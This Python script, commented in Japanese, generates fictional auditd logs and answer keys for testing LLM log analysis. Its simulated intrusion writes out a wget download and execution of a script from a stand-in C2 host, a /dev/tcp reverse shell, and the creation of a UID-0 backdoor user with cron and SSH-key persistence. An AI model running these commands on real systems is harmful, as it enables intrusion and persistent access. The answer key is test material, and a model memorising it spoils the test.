#!/usr/bin/env python3
"""
架空の Linux auditd ログ（audit.log 形式）を生成する（LLM のログ分析の評価用）

平常時の記録（cron、systemd、社内からの鍵ログイン、正規の sudo、外部からの総当たり）の中に、
侵害の一連の記録を挟み込む。正解（answer.json）と設問（question.txt）も同時に出力する。
seed を固定すれば毎回同じ文面になる。標準ライブラリのみ使用。

使い方:
  python3 gen_audit_log.py                         # out_audit/ に audit.log・answer.json・question.txt
  python3 gen_audit_log.py --events 300 --seed 7   # 平常の出来事の数と乱数の種
  python3 gen_audit_log.py --no-incident           # 侵害なし（誤検知・でっち上げの確認用）
  python3 gen_audit_log.py --out out_small --events 40
  python3 gen_audit_log.py --compact --brute 6 --target-tokens 6000
                                                   # 8k の文脈に収まる大きさに自動で調整
  python3 gen_audit_log.py --target-tokens 6000 --url http://127.0.0.1:8080
                                                   # llama-server の /tokenize で正確に数える

大きさの目安（--compact なし）: 侵害の部分だけで約120行・約8,000トークン。
8k の文脈で使うときは --compact と --brute を併用する。

再現しているもの:
  - auditd の主なレコード（SYSCALL / EXECVE / CWD / PATH / PROCTITLE / SOCKADDR / USER_* /
    LOGIN / CRED_* / SERVICE_* / ADD_USER / USER_CHAUTHTOK）
  - 1つの出来事に複数行が同じ「audit(時刻:通番)」で並ぶ形式
  - PROCTITLE と sudo の cmd は16進数（空白を含むため。実物と同じ）
  - SOCKADDR の saddr は16進数（ファミリ・ポート・IPv4 アドレス）
  - root になっても auid（最初にログインした利用者）は変わらない

中身はすべて架空。IP は文書用の予約アドレス（RFC 5737）と社内想定の 10.20.0.0/16。
"""
import argparse
import datetime as dt
import json
import os
import random

JST = dt.timezone(dt.timedelta(hours=9))
HOST = "web01"
UNSET = 4294967295  # auid / ses が未設定のときの値

ATTACKER_IP = "203.0.113.45"
C2_IP, C2_PORT = "198.51.100.23", 4444
VICTIM = ("backup", 1003)
BACKDOOR_USER = "sysupd"   # 攻撃者が追加する UID 0 の利用者
SCRIPT = "upd.sh"           # 攻撃者がダウンロードするスクリプト
USERS = {"tanaka": 1001, "suzuki": 1002, "deploy": 1004}
BADUSERS = ["admin", "test", "oracle", "ubuntu", "pi", "guest", "postgres"]
SERVICES = ["logrotate", "apt-daily", "man-db", "fstrim", "systemd-tmpfiles-clean", "motd-news"]

BIN = {  # コマンド名 → 実行ファイル
    "ls": "/usr/bin/ls", "cat": "/usr/bin/cat", "git": "/usr/bin/git", "vim": "/usr/bin/vim.basic",
    "python3": "/usr/bin/python3.12", "systemctl": "/usr/bin/systemctl", "tail": "/usr/bin/tail",
    "grep": "/usr/bin/grep", "df": "/usr/bin/df", "id": "/usr/bin/id", "uname": "/usr/bin/uname",
    "wget": "/usr/bin/wget", "chmod": "/usr/bin/chmod", "bash": "/usr/bin/bash",
    "useradd": "/usr/sbin/useradd", "crontab": "/usr/bin/crontab", "rm": "/usr/bin/rm",
    "nginx": "/usr/sbin/nginx", "sudo": "/usr/bin/sudo", "passwd": "/usr/bin/passwd",
}

NORMAL_CMDS = {
    "tanaka": [["git", "pull"], ["ls", "-la"], ["python3", "manage.py", "check"], ["vim", "app/views.py"],
               ["git", "status"], ["tail", "-n", "50", "/var/log/nginx/access.log"]],
    "suzuki": [["ls"], ["cat", "README.md"], ["df", "-h"], ["grep", "-r", "TODO", "src"]],
    "deploy": [["git", "pull", "--ff-only"], ["ls", "releases"]],
}


def hexs(s: str) -> str:
    return s.encode("utf-8").hex().upper()


def saddr_v4(ip: str, port: int) -> str:
    """struct sockaddr_in を audit の saddr 表記（16進数）にする"""
    return "0200" + f"{port:04X}" + "".join(f"{int(x):02X}" for x in ip.split(".")) + "0" * 16


class Log:
    def __init__(self, t0: float, rng: random.Random, compact: bool = False):
        self.t, self.rng, self.serial = t0, rng, rng.randint(20000, 40000)
        self.compact = compact  # True のとき、分析に要らない付随レコードを省く
        self.lines = []      # (時刻, 行)
        self.marks = {}      # 正解用：名前 → (時刻, 通番)

    def tick(self, lo: float, hi: float) -> None:
        self.t += self.rng.uniform(lo, hi)

    def event(self, records: list, mark: str = None) -> None:
        """1つの出来事（同じ時刻・通番の複数行）を書く"""
        self.serial += self.rng.randint(1, 6)
        stamp = f"audit({self.t:.3f}:{self.serial})"
        for typ, body in records:
            self.lines.append((self.t, f"type={typ} msg={stamp}: {body}"))
        if mark:
            self.marks[mark] = (self.t, self.serial)

    # ------------------------------------------------ 利用者空間（PAM など）のレコード
    def user_msg(self, typ, pid, uid, auid, ses, msg):
        return (typ, f"pid={pid} uid={uid} auid={auid} ses={ses} subj=unconfined msg='{msg}'")

    # ------------------------------------------------ 実行（execve）の記録
    def execve(self, argv, uid, auid, ses, tty, cwd, ppid, gid=None, key="exec", mark=None):
        pid = self.rng.randint(2000, 65000)
        gid = uid if gid is None else gid
        exe = BIN.get(argv[0], "/usr/bin/" + argv[0])
        a = " ".join(f'a{i}="{x}"' for i, x in enumerate(argv))
        rec = [
            ("SYSCALL", f"arch=c000003e syscall=59 success=yes exit=0 a0=55{self.rng.randint(10**9, 10**10 - 1):x} "
                        f"a1=55{self.rng.randint(10**9, 10**10 - 1):x} a2=55{self.rng.randint(10**9, 10**10 - 1):x} a3=0 "
                        f"items=2 ppid={ppid} pid={pid} auid={auid} uid={uid} gid={gid} euid={uid} suid={uid} "
                        f"fsuid={uid} egid={gid} sgid={gid} fsgid={gid} tty={tty} ses={ses} "
                        f'comm="{os.path.basename(exe)[:15]}" exe="{exe}" subj=unconfined key="{key}"'),
            ("EXECVE", f"argc={len(argv)} {a}"),
            ("CWD", f'cwd="{cwd}"'),
            ("PATH", f'item=0 name="{exe}" inode={self.rng.randint(100000, 999999)} dev=fd:00 mode=0100755 '
                     "ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"),
            ("PATH", f'item=1 name="/lib64/ld-linux-x86-64.so.2" inode={self.rng.randint(100000, 999999)} dev=fd:00 '
                     "mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"),
            ("PROCTITLE", "proctitle=" + "00".join(hexs(x) for x in argv)),
        ]
        if self.compact:  # 動的リンカの PATH と PROCTITLE（EXECVE と同じ内容）を省く
            rec = [r for r in rec if not (r[0] == "PROCTITLE" or "ld-linux" in r[1])]
            rec[0] = (rec[0][0], rec[0][1].replace("items=2", "items=1"))
        self.event(rec, mark)
        return pid

    def file_write(self, path, syscall, uid, auid, ses, tty, comm, exe, key, ppid, create=False, mark=None):
        pid = self.rng.randint(2000, 65000)
        sc = {"openat": 257, "unlinkat": 263, "rename": 82}[syscall]
        parent = os.path.dirname(path) + "/"
        nt = "CREATE" if create else ("DELETE" if syscall == "unlinkat" else "NORMAL")
        rec = [
            ("SYSCALL", f"arch=c000003e syscall={sc} success=yes exit={3 if sc == 257 else 0} a0=ffffff9c "
                        f"a1=7ffd{self.rng.randint(10**6, 10**7):x} a2={'241' if sc == 257 else '0'} a3=1b6 items=2 "
                        f"ppid={ppid} pid={pid} auid={auid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} "
                        f'egid={uid} sgid={uid} fsgid={uid} tty={tty} ses={ses} comm="{comm}" exe="{exe}" '
                        f'subj=unconfined key="{key}"'),
            ("CWD", 'cwd="/root"' if uid == 0 else f'cwd="/home/{VICTIM[0]}"'),
            ("PATH", f'item=0 name="{parent}" inode={self.rng.randint(1000, 99999)} dev=fd:00 mode=040755 '
                     "ouid=0 ogid=0 rdev=00:00 nametype=PARENT cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"),
            ("PATH", f'item=1 name="{path}" inode={self.rng.randint(100000, 999999)} dev=fd:00 mode=0100644 '
                     f"ouid={uid} ogid={uid} rdev=00:00 nametype={nt} cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"),
            ("PROCTITLE", "proctitle=" + hexs(comm)),
        ]
        if self.compact:
            rec = [r for r in rec if r[0] not in ("PROCTITLE", "CWD")]
        self.event(rec, mark)


# ---------------------------------------------------------------- 平常の出来事
def ev_cron(L: Log):
    pid = L.rng.randint(2000, 65000)
    ses = L.rng.randint(100, 999)
    base = 'acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
    if L.compact:
        L.event([L.user_msg("USER_START", pid, 0, 0, ses, "op=PAM:session_open grantors=pam_loginuid,pam_env,pam_permit " + base)])
        L.tick(0.5, 3)
        L.event([L.user_msg("USER_END", pid, 0, 0, ses, "op=PAM:session_close grantors=pam_loginuid,pam_env,pam_permit " + base)])
        return
    L.event([L.user_msg("USER_ACCT", pid, 0, UNSET, UNSET, "op=PAM:accounting grantors=pam_permit " + base)])
    L.event([L.user_msg("CRED_ACQ", pid, 0, UNSET, UNSET, "op=PAM:setcred grantors=pam_permit,pam_cap " + base)])
    L.event([("LOGIN", f"pid={pid} uid=0 subj=unconfined old-auid={UNSET} auid=0 tty=(none) old-ses={UNSET} ses={ses} res=1")])
    L.event([L.user_msg("USER_START", pid, 0, 0, ses, "op=PAM:session_open grantors=pam_loginuid,pam_env,pam_permit " + base)])
    L.tick(0.5, 3)
    L.event([L.user_msg("CRED_DISP", pid, 0, 0, ses, "op=PAM:setcred grantors=pam_permit " + base)])
    L.event([L.user_msg("USER_END", pid, 0, 0, ses, "op=PAM:session_close grantors=pam_loginuid,pam_env,pam_permit " + base)])


def ev_service(L: Log):
    u = L.rng.choice(SERVICES)
    for typ in ("SERVICE_START", "SERVICE_STOP"):
        L.event([L.user_msg(typ, 1, 0, UNSET, UNSET,
                            f'unit={u} comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success')])
        L.tick(1, 20)


def ev_scan(L: Log):
    """インターネットからの無差別な総当たり（攻撃者とは別）"""
    ip = f"192.0.2.{L.rng.randint(2, 250)}"
    for _ in range(L.rng.randint(1, 3)):
        pid = L.rng.randint(2000, 65000)
        L.event([L.user_msg("USER_LOGIN", pid, 0, UNSET, UNSET,
                            f'op=login acct="(invalid user)" exe="/usr/sbin/sshd" hostname=? addr={ip} terminal=sshd res=failed')])
        L.tick(1, 4)


def ev_user_session(L: Log, ses_box: list):
    """社内からの鍵ログインと、いくつかのコマンド実行"""
    name = L.rng.choice(list(USERS))
    uid = USERS[name]
    ip = f"10.20.{L.rng.randint(1, 9)}.{L.rng.randint(2, 250)}"
    pid = L.rng.randint(2000, 65000)
    ses_box[0] += 1
    ses = ses_box[0]
    tty = f"pts{L.rng.randint(0, 3)}"
    L.event([L.user_msg("USER_AUTH", pid, 0, UNSET, UNSET,
                        f'op=pubkey acct="{name}" exe="/usr/sbin/sshd" hostname=? addr={ip} terminal=ssh res=success')])
    L.event([("LOGIN", f"pid={pid} uid=0 subj=unconfined old-auid={UNSET} auid={uid} tty=(none) old-ses={UNSET} ses={ses} res=1")])
    L.event([L.user_msg("USER_START", pid, 0, uid, ses,
                        f'op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ip} addr={ip} terminal=ssh res=success')])
    L.event([L.user_msg("USER_LOGIN", pid, 0, uid, ses,
                        f'op=login id={uid} exe="/usr/sbin/sshd" hostname=? addr={ip} terminal=/dev/{tty.replace("pts", "pts/")} res=success')])
    shell = L.rng.randint(2000, 65000)
    for argv in L.rng.sample(NORMAL_CMDS[name], k=min(len(NORMAL_CMDS[name]), L.rng.randint(1, 3))):
        L.tick(5, 120)
        L.execve(argv, uid, uid, ses, tty, f"/home/{name}", shell)
    if name == "deploy":  # 正規の sudo（nginx の再読み込み）
        L.tick(5, 30)
        sudo_cmd(L, name, uid, ses, tty, f"/home/{name}", ["systemctl", "reload", "nginx"], shell)
    if name == "tanaka" and L.rng.random() < 0.3:  # 自分のパスワード変更（紛らわしいが正常）
        L.tick(5, 30)
        L.execve(["passwd"], uid, uid, ses, tty, f"/home/{name}", shell)
        L.event([L.user_msg("USER_CHAUTHTOK", L.rng.randint(2000, 65000), uid, uid, ses,
                            f'op=PAM:chauthtok grantors=pam_pwquality,pam_unix acct="{name}" exe="/usr/bin/passwd" hostname={HOST} addr=? terminal=/dev/{tty.replace("pts", "pts/")} res=success')])
    L.tick(30, 600)
    L.event([L.user_msg("USER_END", pid, 0, uid, ses,
                        f'op=PAM:session_close grantors=pam_selinux,pam_loginuid,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ip} addr={ip} terminal=ssh res=success')])
    L.event([L.user_msg("USER_LOGOUT", pid, 0, uid, ses,
                        f'op=logout id={uid} exe="/usr/sbin/sshd" hostname=? addr=? terminal=/dev/{tty.replace("pts", "pts/")} res=success')])


def sudo_cmd(L: Log, name, uid, ses, tty, cwd, argv, shell, mark=None):
    pid = L.rng.randint(2000, 65000)
    term = "/dev/" + tty.replace("pts", "pts/")
    full = [BIN.get(argv[0], argv[0])] + argv[1:]
    L.event([L.user_msg("USER_ACCT", pid, uid, uid, ses,
                        f'op=PAM:accounting grantors=pam_permit acct="{name}" exe="/usr/bin/sudo" hostname=? addr=? terminal={term} res=success')])
    L.event([L.user_msg("USER_CMD", pid, uid, uid, ses,
                        f'cwd="{cwd}" cmd={hexs(" ".join(full))} exe="/usr/bin/sudo" terminal={tty.replace("pts", "pts/")} res=success')],
            mark)
    if L.compact:  # sudo の付随レコードを省き、USER_CMD と実行の記録だけ残す
        L.tick(0.05, 0.3)
        L.execve(argv, 0, uid, ses, tty, cwd, pid, gid=0)
        return
    L.event([L.user_msg("CRED_REFR", pid, 0, uid, ses,
                        f'op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal={term} res=success')])
    L.event([L.user_msg("USER_START", pid, 0, uid, ses,
                        f'op=PAM:session_open grantors=pam_limits,pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal={term} res=success')])
    L.tick(0.05, 0.3)
    L.execve(argv, 0, uid, ses, tty, cwd, pid, gid=0)
    L.tick(0.5, 3)
    L.event([L.user_msg("USER_END", pid, 0, uid, ses,
                        f'op=PAM:session_close grantors=pam_limits,pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal={term} res=success')])
    L.event([L.user_msg("CRED_DISP", pid, 0, uid, ses,
                        f'op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal={term} res=success')])


# ---------------------------------------------------------------- 侵害
def incident(L: Log, ses_box: list, brute: int = 23):
    name, uid = VICTIM
    n_backup = max(1, round(brute * 5 / 23))
    # 1. 総当たり（root → backup）
    for acct, n in (("root", max(0, brute - n_backup)), (name, n_backup)):
        for _ in range(n):
            pid = L.rng.randint(2000, 65000)
            L.event([L.user_msg("USER_AUTH", pid, 0, UNSET, UNSET,
                                f'op=PAM:authentication grantors=? acct="{acct}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=failed')],
                    mark="brute_first" if "brute_first" not in L.marks else None)
            L.tick(1, 3)
    # 2. パスワードで侵入成功
    pid = L.rng.randint(2000, 65000)
    ses_box[0] += 1
    ses = ses_box[0]
    tty = "pts1"
    L.event([L.user_msg("USER_AUTH", pid, 0, UNSET, UNSET,
                        f'op=PAM:authentication grantors=pam_permit,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=success')],
            mark="login_success")
    if not L.compact:
        L.event([L.user_msg("USER_ACCT", pid, 0, UNSET, UNSET,
                            f'op=PAM:accounting grantors=pam_permit acct="{name}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=success')])
        L.event([L.user_msg("CRED_ACQ", pid, 0, UNSET, UNSET,
                            f'op=PAM:setcred grantors=pam_permit,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=success')])
    L.event([("LOGIN", f"pid={pid} uid=0 subj=unconfined old-auid={UNSET} auid={uid} tty=(none) old-ses={UNSET} ses={ses} res=1")])
    L.event([L.user_msg("USER_START", pid, 0, uid, ses,
                        f'op=PAM:session_open grantors=pam_loginuid,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=success')])
    L.event([L.user_msg("USER_LOGIN", pid, 0, uid, ses,
                        f'op=login id={uid} exe="/usr/sbin/sshd" hostname=? addr={ATTACKER_IP} terminal=/dev/pts/1 res=success')])
    shell = L.rng.randint(2000, 65000)
    cwd = f"/home/{name}"
    # 3. 偵察
    for argv in (["id"], ["uname", "-a"], ["cat", "/etc/passwd"]):
        L.tick(2, 8)
        L.execve(argv, uid, uid, ses, tty, cwd, shell)
    # 4. sudo でダウンロード・実行
    L.tick(5, 15)
    sudo_cmd(L, name, uid, ses, tty, cwd, ["wget", "-q", f"http://{C2_IP}/{SCRIPT}", "-O", f"/tmp/.{SCRIPT}"], shell,
             mark="download")
    L.tick(2, 6)
    sudo_cmd(L, name, uid, ses, tty, cwd, ["chmod", "+x", f"/tmp/.{SCRIPT}"], shell)
    L.tick(1, 3)
    sudo_cmd(L, name, uid, ses, tty, cwd, ["bash", f"/tmp/.{SCRIPT}"], shell, mark="exec_payload")
    sh = L.rng.randint(2000, 65000)
    # 5. スクリプトの中身：UID 0 の利用者追加・cron・SSH 鍵・外部への接続
    L.tick(0.2, 1)
    L.execve(["useradd", "-o", "-u", "0", "-g", "0", "-M", "-d", "/root", "-s", "/bin/bash", BACKDOOR_USER],
             0, uid, ses, tty, "/tmp", sh, gid=0)
    L.event([L.user_msg("ADD_USER", L.rng.randint(2000, 65000), 0, uid, ses,
                        f'op=add-user acct="{BACKDOOR_USER}" exe="/usr/sbin/useradd" hostname={HOST} addr=? terminal=pts/1 res=success')],
            mark="add_user")
    L.file_write("/etc/passwd", "openat", 0, uid, ses, tty, "useradd", "/usr/sbin/useradd", "identity", sh)
    L.file_write("/etc/shadow", "openat", 0, uid, ses, tty, "useradd", "/usr/sbin/useradd", "identity", sh)
    L.tick(0.3, 1)
    L.file_write(f"/etc/cron.d/{BACKDOOR_USER}", "openat", 0, uid, ses, tty, "bash", "/usr/bin/bash", "cron", sh,
                 create=True, mark="cron")
    L.tick(0.3, 1)
    L.file_write("/root/.ssh/authorized_keys", "openat", 0, uid, ses, tty, "bash", "/usr/bin/bash", "rootkey", sh,
                 mark="authorized_keys")
    L.tick(0.5, 2)
    L.event([
        ("SYSCALL", f"arch=c000003e syscall=42 success=no exit=-115 a0=3 a1=7ffd{L.rng.randint(10**6, 10**7):x} a2=10 a3=0 "
                    f"items=0 ppid={sh} pid={L.rng.randint(2000, 65000)} auid={uid} uid=0 gid=0 euid=0 suid=0 fsuid=0 "
                    f'egid=0 sgid=0 fsgid=0 tty={tty} ses={ses} comm="bash" exe="/usr/bin/bash" subj=unconfined key="network_connect"'),
        ("SOCKADDR", "saddr=" + saddr_v4(C2_IP, C2_PORT)),
        ("PROCTITLE", "proctitle=" + "00".join(hexs(x) for x in ["bash", "-c", f"bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1"])),
    ], mark="c2_connect")
    # 6. 痕跡の消去
    L.tick(20, 60)
    L.file_write(f"/home/{name}/.bash_history", "unlinkat", uid, uid, ses, tty, "rm", "/usr/bin/rm", "delete", shell,
                 mark="history_delete")
    L.tick(2, 10)
    L.event([L.user_msg("USER_END", pid, 0, uid, ses,
                        f'op=PAM:session_close grantors=pam_loginuid,pam_unix acct="{name}" exe="/usr/sbin/sshd" hostname={ATTACKER_IP} addr={ATTACKER_IP} terminal=ssh res=success')])
    L.event([L.user_msg("USER_LOGOUT", pid, 0, uid, ses,
                        f'op=logout id={uid} exe="/usr/sbin/sshd" hostname=? addr=? terminal=/dev/pts/1 res=success')],
            mark="logout")
    return ses


# ---------------------------------------------------------------- 出力
QUESTION = """上記は Linux サーバー web01 の auditd のログ（/var/log/audit/audit.log）です。
このログだけを根拠に、次の問いに日本語で答えてください。時刻は日本時間（JST）で答えてください。
ログから判断できないことは「不明」と答え、推測で補わないでください。

(1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
(2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
(3) 侵入に成功した時刻はいつですか。
(4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
(6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
"""

QUESTION_NO_INCIDENT_NOTE = "（このファイルは侵害を含まない対照用です。正しい答えは「侵害の痕跡はない」です）\n"


def generate(a, events: int):
    """同じ seed なら同じログを作る（--target-tokens で何度か作り直すため関数にしている）"""
    rng = random.Random(a.seed)
    t0 = dt.datetime.fromisoformat(a.start).replace(tzinfo=JST).timestamp()
    L = Log(t0, rng, a.compact)
    ses_box = [rng.randint(1, 20)]
    kinds = [ev_cron] * 4 + [ev_service] * 2 + [ev_scan] * 2 + [ev_user_session] * 2
    inc_at = int(events * a.position)
    ses = None
    for i in range(events + 1):
        if i == inc_at and not a.no_incident:
            L.tick(60, 300)
            ses = incident(L, ses_box, a.brute)
        if i == events:
            break
        L.tick(30, 400)
        k = rng.choice(kinds)
        k(L, ses_box) if k is ev_user_session else k(L)
    L.lines.sort(key=lambda x: x[0])  # 出来事が時間的に重なった分を並べ直す（同時刻内の順序は保つ）
    return L, ses


def count_tokens(text: str, url: str = None) -> int:
    if url:
        import urllib.request
        req = urllib.request.Request(url.rstrip("/") + "/tokenize", data=json.dumps({"content": text}).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=60) as r:
            return len(json.load(r)["tokens"])
    return int(len(text) / 2.5)  # 16進数や ID が多いので、英文より多めに見積もる


def jst(t: float) -> str:
    return dt.datetime.fromtimestamp(t, JST).strftime("%Y-%m-%d %H:%M:%S")


def main() -> None:
    ap = argparse.ArgumentParser(description="架空の auditd ログを生成する")
    ap.add_argument("--events", type=int, default=120, help="平常の出来事の数（多いほどログが長くなる）")
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--start", default="2026-11-12T00:00:00", help="開始時刻（JST）")
    ap.add_argument("--position", type=float, default=0.7, help="侵害を挟む位置（0〜1）")
    ap.add_argument("--no-incident", action="store_true", help="侵害を含めない（対照用）")
    ap.add_argument("--out", default="out_audit", help="出力ディレクトリ")
    ap.add_argument("--compact", action="store_true", help="分析に要らない付随レコードを省いて短くする")
    ap.add_argument("--brute", type=int, default=23, help="攻撃者の総当たりの失敗回数（既定 23）")
    ap.add_argument("--target-tokens", type=int, help="ログ全体がこのトークン数以下になるよう、平常の出来事の数を減らす")
    ap.add_argument("--url", help="llama-server の URL。指定すると /tokenize で正確に数える（なければ文字数から推定）")
    ap.add_argument("--vary", action="store_true",
                    help="攻撃元 IP・接続先 IP とポート・アカウント名・追加される利用者名・スクリプト名を seed に応じて変える"
                         "（複数のログで精度を測るとき用。付けなければ従来と同じ固定値）")
    a = ap.parse_args()

    if a.vary:
        global ATTACKER_IP, C2_IP, C2_PORT, VICTIM, BACKDOOR_USER, SCRIPT
        v = random.Random(a.seed * 7919 + 1)  # ログ本体の乱数とは別系列にする
        ATTACKER_IP = f"203.0.113.{v.randint(2, 250)}"
        C2_IP = f"198.51.100.{v.randint(2, 250)}"
        C2_PORT = v.choice([4444, 1337, 8443, 9001, 31337, 5555, 6667, 53])
        VICTIM = (v.choice(["backup", "ops", "jenkins", "report", "nagios"]), 1003)
        BACKDOOR_USER = v.choice(["sysupd", "svcmon", "dbmaint", "logsync", "kworkerd"])
        SCRIPT = v.choice(["upd.sh", "fix.sh", "run.sh", "sync.sh", "init.sh"])

    count = lambda text: count_tokens(text, a.url)
    events = a.events
    while True:
        L, ses = generate(a, events)
        text = "\n".join(line for _, line in L.lines)
        n_tok = count(text)
        if not a.target_tokens or n_tok <= a.target_tokens or events == 0:
            break
        events = max(0, min(events - 1, int(events * a.target_tokens / n_tok)))
    if a.target_tokens and n_tok > a.target_tokens:
        print(f"! 平常の出来事を0にしても {n_tok:,} トークンあります。--compact や --brute を小さくしてください")
    if events != a.events:
        print(f"平常の出来事を {a.events} → {events} に減らしました")
    os.makedirs(a.out, exist_ok=True)
    with open(os.path.join(a.out, "audit.log"), "w", encoding="utf-8") as f:
        f.write("\n".join(line for _, line in L.lines) + "\n")

    if a.no_incident:
        answer = {"compromised": False, "note": "侵害なしの対照用ログ。侵害を指摘したら誤検知（でっち上げ）"}
    else:
        m = {k: {"time_jst": jst(t), "epoch": round(t, 3), "serial": s} for k, (t, s) in L.marks.items()}
        n_backup = max(1, round(a.brute * 5 / 23))
        answer = {
            "compromised": True,
            "attacker_ip": ATTACKER_IP,
            "account": VICTIM[0], "account_uid": VICTIM[1], "session_ses": ses,
            "login_success": m["login_success"],
            "brute_force": {"first": m.get("brute_first"), "attempts_root": max(0, a.brute - n_backup),
                            "attempts_backup": n_backup},
            "actions": [
                {"step": "偵察", "detail": "id / uname -a / cat /etc/passwd"},
                {"step": "ダウンロード", "detail": f"sudo wget -q http://{C2_IP}/{SCRIPT} -O /tmp/.{SCRIPT}", **m["download"]},
                {"step": "実行権限付与", "detail": f"sudo chmod +x /tmp/.{SCRIPT}"},
                {"step": "実行", "detail": f"sudo bash /tmp/.{SCRIPT}", **m["exec_payload"]},
                {"step": "持続化：UID 0 の利用者追加", "detail": f"useradd -o -u 0 -g 0 ... {BACKDOOR_USER}（ADD_USER と /etc/passwd・/etc/shadow への書き込み）", **m["add_user"]},
                {"step": "持続化：cron", "detail": f"/etc/cron.d/{BACKDOOR_USER} を新規作成（key=cron）", **m["cron"]},
                {"step": "持続化：SSH 鍵", "detail": "/root/.ssh/authorized_keys に書き込み（key=rootkey）", **m["authorized_keys"]},
                {"step": "外部への通信（リバースシェル）", "detail": f"connect → {C2_IP}:{C2_PORT}（SOCKADDR）", **m["c2_connect"]},
                {"step": "痕跡の消去", "detail": f"/home/{VICTIM[0]}/.bash_history を削除（key=delete）", **m["history_delete"]},
                {"step": "ログアウト", **m["logout"]},
            ],
            "c2": {"ip": C2_IP, "port": C2_PORT, "saddr": saddr_v4(C2_IP, C2_PORT)},
            "persistence": [f"UID 0 の利用者 {BACKDOOR_USER}", f"/etc/cron.d/{BACKDOOR_USER}", "/root/.ssh/authorized_keys"],
            "backdoor_user": BACKDOOR_USER, "script": SCRIPT,
            "distractors": [
                "192.0.2.0/24 からの無効な利用者名での失敗ログイン（無差別な総当たり。侵入には至っていない）",
                "deploy の sudo systemctl reload nginx（正規の運用）",
                "tanaka の passwd（USER_CHAUTHTOK。自分のパスワード変更で正常）",
            ],
            "key_points": [
                f"sudo で root になっても auid=1003（{VICTIM[0]}）のまま。誰の操作かは auid で追う",
                "USER_CMD の cmd と PROCTITLE は16進数。解読するとコマンドがわかる",
                "SOCKADDR の saddr: 0200=AF_INET、次の4桁がポート、次の8桁が IPv4 アドレス",
            ],
        }
    with open(os.path.join(a.out, "answer.json"), "w", encoding="utf-8") as f:
        json.dump(answer, f, ensure_ascii=False, indent=2)
    with open(os.path.join(a.out, "question.txt"), "w", encoding="utf-8") as f:
        f.write((QUESTION_NO_INCIDENT_NOTE if a.no_incident else "") + QUESTION)

    how = "（/tokenize で計数）" if a.url else "（文字数からの推定）"
    print(f"出力: {a.out}/audit.log（{len(L.lines)} 行、{len(text):,} 文字、"
          f"{n_tok:,} トークン{how}）、answer.json、question.txt")
    print(f"期間: {jst(L.lines[0][0])} 〜 {jst(L.lines[-1][0])}（JST）")
    if not a.no_incident:
        print(f"侵入成功: {answer['login_success']['time_jst']}  攻撃元 {ATTACKER_IP}  アカウント {VICTIM[0]}")


if __name__ == "__main__":
    main()
